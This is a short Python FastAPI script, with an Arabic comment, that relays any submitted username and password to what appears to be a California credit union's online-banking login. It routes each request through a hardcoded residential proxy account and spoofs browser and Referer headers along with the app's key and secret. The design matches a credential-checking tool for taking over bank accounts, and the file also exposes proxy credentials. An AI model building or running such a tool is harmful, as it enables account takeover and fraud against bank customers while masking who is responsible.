from fastapi import FastAPI, Form
import requests

app = FastAPI()

# إعداد البروكسي
proxy_host = "pr.lunaproxy.com"
proxy_port = "12233"
proxy_user = "user-klumren_L8ezO-region-us"
proxy_pass = "333Admin"

proxy_url = f"http://{proxy_user}:{proxy_pass}@{proxy_host}:{proxy_port}"
proxies = {
    "http": proxy_url,
    "https": proxy_url
}

@app.post("/login")
def login(userid: str = Form(...), password: str = Form(...)):
    url = "https://100026338.auth.konycloud.com/login?provider=CCCUOktaDev"

    payload = {
        "userid": userid,
        "password": password,
        "loginOptions": '{"isOfflineEnabled": false}',
        "provider": "CCCUOktaDev"
    }

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) Gecko/20100101 Firefox/142.0",
        "Accept": "application/json",
        "Content-Type": "application/x-www-form-urlencoded",
        "Referer": "https://digital.calcoastcu.org/",
        "X-Kony-RequestId": "1234567890",
        "X-Kony-App-Key": "1834cc76a3b8f2691cbae9b2b9308cc5",
        "X-Kony-App-Secret": "63976e8a5fa955b59b4a073b2d950fda",
        "X-Kony-SDK-Type": "js",
        "X-Kony-SDK-Version": "9.7.52",
        "X-Kony-Platform-Type": "web",
        "X-Kony-App-Version": "1.0",
    }

    try:
        resp = requests.post(url, data=payload, headers=headers, proxies=proxies, timeout=30)
        return {
            "status_code": resp.status_code,
            "response": resp.text
        }
    except Exception as e:
        return {"error": str(e)}
